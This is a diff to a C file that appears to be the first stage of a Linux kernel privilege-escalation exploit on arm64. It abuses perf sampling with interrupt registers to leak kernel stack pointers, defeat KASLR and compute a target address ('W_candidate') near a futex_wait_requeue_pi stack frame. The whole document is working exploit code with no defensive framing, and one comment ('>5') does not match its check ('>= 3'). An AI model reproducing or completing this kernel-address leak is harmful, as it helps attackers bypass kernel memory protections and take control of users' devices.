@@ -1,17 +1,17 @@
 /*
- * perf_sp_leak.c — Phase 1 v2: dump all sample IPs + SP to diagnose
- *
- * 问题：CPU clock sampling 命中 futex_wait_requeue_pi 的概率极低
- * 诊断：先看所有 sample 的 IP 分布，再决定下一步
+ * perf_sp_leak.c — Phase 1v3: dump ALL samples (no IP filter)
+ * KASLR shifts kernel text to 0xffffffe3..., not our expected 0xffffffc0...
+ * Strategy: dump all (IP, SP) pairs, then use SP relationship to identify
+ * futex_wait_requeue_pi samples.
  */
 #include "common.h"
 #include <linux/perf_event.h>
 
 #define W_DELTA 0x90
 
-/* futex_wait_requeue_pi range — 扩大范围以包含调用者 */
-#define FWRP_START 0xffffffc008294000ULL  /* futex_lock_pi 起 */
-#define FWRP_END   0xffffffc008297000ULL  /* 整个 futex PI 区域 */
+int g_perf_fd = -1;
+void *g_perf_buf = NULL;
+size_t g_perf_msz = 0;
 
 void perf_sp_start(void) {
     struct perf_event_attr pe;
@@ -19,7 +19,7 @@ void perf_sp_start(void) {
     pe.type = PERF_TYPE_SOFTWARE;
     pe.size = sizeof(pe);
     pe.config = PERF_COUNT_SW_CPU_CLOCK;
-    pe.sample_period = 100;  /* 更高频率 */
+    pe.sample_period = 50;
     pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
     pe.sample_regs_intr = (1ULL << 32) - 1;
     pe.disabled = 1;
@@ -32,22 +32,9 @@ void perf_sp_start(void) {
     size_t msz = 4096 * (1 + 32);
     void *buf = mmap(NULL, msz, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
     if (buf == MAP_FAILED) { close(fd); return; }
-
-    /* store fd/buf in file-static vars for stop function */
-    extern int g_perf_fd;
-    extern void *g_perf_buf;
-    extern size_t g_perf_msz;
-    g_perf_fd = fd;
-    g_perf_buf = buf;
-    g_perf_msz = msz;
-
+    g_perf_fd = fd; g_perf_buf = buf; g_perf_msz = msz;
     ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
 }
-
-/* Use the same g_perf_fd/g_perf_buf globals */
-int g_perf_fd = -1;
-void *g_perf_buf = NULL;
-size_t g_perf_msz = 0;
 
 void perf_sp_stop_and_report(void) {
     if (g_perf_fd < 0) return;
@@ -60,16 +47,12 @@ void perf_sp_stop_and_report(void) {
     size_t dsz = 4096 * 32;
     uint64_t pos = hdr->data_tail;
 
-    int total = 0, in_range = 0;
-    uint64_t sp_vals[512], ip_vals[512];
-    int nsp = 0;
+    int total = 0;
+    /* Store all (IP, SP) pairs */
+    uint64_t all_ip[2048], all_sp[2048];
+    int nall = 0;
 
-    /* IP histogram for diagnosis */
-    uint64_t ip_hist[64];
-    int ip_hist_cnt[64];
-    int nhist = 0;
-
-    while (pos < head && nsp < 512) {
+    while (pos < head && nall < 2048) {
         struct perf_event_header *ev = (void *)(base + (pos % dsz));
         if (ev->size == 0) break;
         if (ev->type == PERF_RECORD_SAMPLE) {
@@ -77,25 +60,12 @@ void perf_sp_stop_and_report(void) {
             char *p = (char *)ev + sizeof(*ev);
             uint64_t ip = *(uint64_t *)p; p += 8;
             uint64_t abi = *(uint64_t *)p; p += 8;
-
-            /* Record IP histogram */
-            int found = 0;
-            for (int j = 0; j < nhist; j++) {
-                if (ip_hist[j] == ip) { ip_hist_cnt[j]++; found = 1; break; }
-            }
-            if (!found && nhist < 64) { ip_hist[nhist] = ip; ip_hist_cnt[nhist] = 1; nhist++; }
-
-            if (ip >= FWRP_START && ip < FWRP_END) {
-                in_range++;
-                if (abi == 1 || abi == 2) {
-                    uint64_t *regs = (uint64_t *)p;
-                    uint64_t sp = regs[31];
-                    if (sp > 0xffffff8000000000ULL && sp < 0xffffff8c00000000ULL) {
-                        sp_vals[nsp] = sp;
-                        ip_vals[nsp] = ip;
-                        nsp++;
-                    }
-                }
+            if (abi == 1 || abi == 2) {
+                uint64_t *regs = (uint64_t *)p;
+                uint64_t sp = regs[31]; /* SP */
+                all_ip[nall] = ip;
+                all_sp[nall] = sp;
+                nall++;
             }
         }
         pos += ev->size;
@@ -106,32 +76,47 @@ void perf_sp_stop_and_report(void) {
     close(g_perf_fd);
     g_perf_fd = -1;
 
-    pr_info("perf: total=%d in_range=%d kernel_sp=%d\n", total, in_range, nsp);
+    pr_info("perf: total=%d with_regs=%d\n", total, nall);
 
-    /* Print top IPs */
-    pr_info("=== top sample IPs ===\n");
-    /* Sort by count */
-    for (int i = 0; i < nhist; i++) {
-        for (int j = i+1; j < nhist; j++) {
-            if (ip_hist_cnt[j] > ip_hist_cnt[i]) {
-                uint64_t t = ip_hist[i]; ip_hist[i] = ip_hist[j]; ip_hist[j] = t;
-                int tc = ip_hist_cnt[i]; ip_hist_cnt[i] = ip_hist_cnt[j]; ip_hist_cnt[j] = tc;
+    /* Strategy: group by unique SP values.
+     * If many samples share the same SP, that SP likely corresponds to
+     * a function where SP is constant (like futex_wait_requeue_pi after prologue).
+     * For those, W = SP + 0x90. */
+
+    /* Count unique SP values */
+    uint64_t uniq_sp[256];
+    int uniq_cnt[256];
+    int nuniq = 0;
+
+    for (int i = 0; i < nall; i++) {
+        uint64_t sp = all_sp[i];
+        int found = 0;
+        for (int j = 0; j < nuniq; j++) {
+            if (uniq_sp[j] == sp) { uniq_cnt[j]++; found = 1; break; }
+        }
+        if (!found && nuniq < 256) { uniq_sp[nuniq] = sp; uniq_cnt[nuniq] = 1; nuniq++; }
+    }
+
+    /* Sort by count descending */
+    for (int i = 0; i < nuniq; i++) {
+        for (int j = i+1; j < nuniq; j++) {
+            if (uniq_cnt[j] > uniq_cnt[i]) {
+                uint64_t ts = uniq_sp[i]; uniq_sp[i] = uniq_sp[j]; uniq_sp[j] = ts;
+                int tc = uniq_cnt[i]; uniq_cnt[i] = uniq_cnt[j]; uniq_cnt[j] = tc;
             }
         }
     }
-    for (int i = 0; i < nhist && i < 10; i++) {
-        uint64_t ip = ip_hist[i];
-        const char *label = "";
-        if (ip >= 0xffffffc008294000ULL && ip < 0xffffffc008297000ULL)
-            label = " <-- futex PI region";
-        pr_info("  0x%016llx x%d%s\n", ip, ip_hist_cnt[i], label);
+
+    pr_info("=== unique SP values (top 10) ===\n");
+    for (int i = 0; i < nuniq && i < 10; i++) {
+        pr_info("  SP=0x%016llx  count=%d  W=0x%016llx\n",
+                uniq_sp[i], uniq_cnt[i], uniq_sp[i] + W_DELTA);
     }
 
-    if (nsp > 0) {
-        pr_info("=== W candidates ===\n");
-        for (int i = 0; i < nsp; i++)
-            pr_info("  IP=0x%016llx SP=0x%016llx W=0x%016llx\n",
-                    ip_vals[i], sp_vals[i], sp_vals[i] + W_DELTA);
+    /* If top SP has many samples (>5), it's likely a stable-frame function */
+    if (nuniq > 0 && uniq_cnt[0] >= 3) {
+        pr_success("Top SP has %d samples — likely stable frame\n", uniq_cnt[0]);
+        pr_success("W_candidate = 0x%016llx\n", uniq_sp[0] + W_DELTA);
     }
 }
 
